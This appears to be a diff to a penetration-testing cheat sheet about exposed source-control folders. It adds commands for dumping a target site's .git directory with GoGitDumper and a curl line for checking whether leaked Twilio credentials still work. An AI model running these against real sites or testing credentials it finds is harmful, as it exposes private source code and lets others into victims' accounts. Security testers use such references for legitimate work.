@@ -3,6 +3,7 @@
 - [GIT - Source code management](#git---source-code-management)
   - [Github example with a .git](#github-example-with-a-git)
   - [Automatic way : diggit.py](#automatic-way--diggitpy)
+  - [Automatic way : GoGitDumper](#automatic-way-gogitdumper)
   - [Automatic way : rip-git](#automatic-way--rip-git)
   - [Automatic way : GitHack](#automatic-way--githack)
   - [Harvesting secrets : trufflehog](#harvesting-secrets--trufflehog)
@@ -14,6 +15,7 @@
 - [BAZAAR - Source code management](#bazaar---source-code-management)
   - [Automatic way : rip-bzr](#automatic-way--rip-bzr)
   - [Automatic way : bzr_dumper](#automatic-way--bzr_dumper)
+- [Leaked API keys](#leaked-api-keys)
 
 ## GIT - Source code management
 
@@ -106,6 +108,15 @@ sha1 = d7ef4d77741c38b6d3806e0c6a57bf1090eec141
 -u is remote path, where .git folder exists
 -t is path to local folder with dummy Git repository and where blob content (files) are saved with their real names (cd /path/to/temp/folder && git init)
 -o is a hash of particular Git object to download
+```
+
+### Automatic way : GoGitDumper
+
+```powershell
+go get github.com/c-sto/gogitdumper
+gogitdumper -u http://urlhere.com/.git/ -o yourdecideddir/.git/
+git log
+git checkout
 ```
 
 ### Automatic way : rip-git
@@ -224,6 +235,16 @@ $ bzr revert
  N  application.py
  N  database.py
  N  static/   
+```
+
+## Leaked API keys
+
+If you find any key , use the [keyhacks](https://github.com/streaak/keyhacks) from @streaak to verifiy them.
+
+Twilio example :
+
+```powershell
+curl -X GET 'https://api.twilio.com/2010-04-01/Accounts/ACCOUNT_SID/Keys.json' -u ACCOUNT_SID:AUTH_TOKEN
 ```
 
 ## References
